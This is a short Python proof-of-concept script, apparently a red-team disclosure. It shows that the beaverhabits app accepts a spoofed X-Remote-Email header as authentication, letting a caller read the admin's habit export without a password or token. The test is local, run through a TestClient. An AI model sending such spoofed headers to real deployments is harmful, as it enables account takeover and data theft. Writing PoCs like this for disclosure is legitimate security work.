"""Red-team proof of concept: trusted-email-header spoofing.

If an operator sets TRUSTED_EMAIL_HEADER and the app is reachable without a
header-stripping reverse proxy, any caller can set that header and authenticate
as any existing user (including the admin) with no password and no token.

Run: TRUSTED_EMAIL_HEADER=X-Remote-Email uv run python poc_header.py
"""
import os

os.environ.setdefault("TRUSTED_EMAIL_HEADER", "X-Remote-Email")
os.environ.setdefault("JWT_SECRET", "SECRET")

from fastapi.testclient import TestClient

from beaverhabits.configs import settings
from beaverhabits.main import app

assert settings.TRUSTED_EMAIL_HEADER == "X-Remote-Email"


def main() -> None:
    client = TestClient(app)
    with client:
        admin_email = "admin@example.com"
        client.post("/auth/register", json={"email": admin_email, "password": "anything"})

        # Attacker sends only the trusted header. No token, no password.
        # The app's current_active_user trusts the header for /api/v1/* routes.
        r = client.get("/api/v1/habits/export", headers={"X-Remote-Email": admin_email})
        print(f"GET /api/v1/habits/export with spoofed header -> {r.status_code} {r.text[:40]}")
        assert r.status_code == 200

        print("\n[OK] authenticated as admin with only a spoofed header")


if __name__ == "__main__":
    main()
